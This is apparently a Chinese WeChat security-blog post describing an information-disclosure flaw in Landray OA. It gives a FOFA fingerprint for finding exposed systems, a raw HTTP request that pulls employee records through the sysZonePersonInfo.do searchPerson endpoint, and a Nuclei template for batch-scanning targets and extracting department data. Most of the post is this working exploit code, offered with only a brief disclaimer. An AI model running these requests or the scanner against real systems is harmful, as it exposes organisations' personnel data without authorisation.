#  蓝凌OA 信息泄露

原创 Kokoxca安全  [ Kokoxca安全 ](javascript:void\(0\);)

**Kokoxca安全** ![]()

微信号 gh_b130bebc48f2

功能介绍 学习网络安全，渗透笔记，代码审计。

____

___发表于_

0x01
技术文章仅供参考学习，请勿使用本文中所提供的任何技术信息或代码工具进行非法测试和违法行为。若使用者利用本文中技术信息或代码工具对任何计算机系统造成的任何直接或者间接的后果及损失，均由使用者本人负责。本文所提供的技术信息或代码工具仅供于学习，一切不良后果与文章作者无关。使用者应该遵守法律法规，并尊重他人的合法权益。

0x02 指纹信息

  * 

    
    
    app="Landray-OA系统"

0x03漏洞复现

数据包

  *   *   *   *   *   *   *   *   *   * 

    
    
    GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=200&s_ajax=true HTTP/1.1Host: xxxxCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=F7FF497303B2F4CD39FC43E5EDB2D015Connection: close

![]()

批量检测脚本  

![]()

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    id: landray-sysZonePersonInfo-infoleak  
    info:  name: landray-sysZonePersonInfo-infoleak  author: Kokoxca  severity: high  
      
    http:  - raw:      - |        GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=20&s_ajax=true HTTP/1.1        Host: {{Hostname}}        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36        Accept-Encoding: gzip        Connection: close  
      
      
        matchers:      - type: dsl        dsl:          - status_code==200 && contains_all(body,"columns","title","property")  
      
        extractors:      - type: json        part: body        json:          - .datas[][] | select(.col == "fdDept") | .value

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 蓝凌OA 信息泄露

原创 Kokoxca安全  [ Kokoxca安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

Kokoxca安全

赞 分享 在看

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

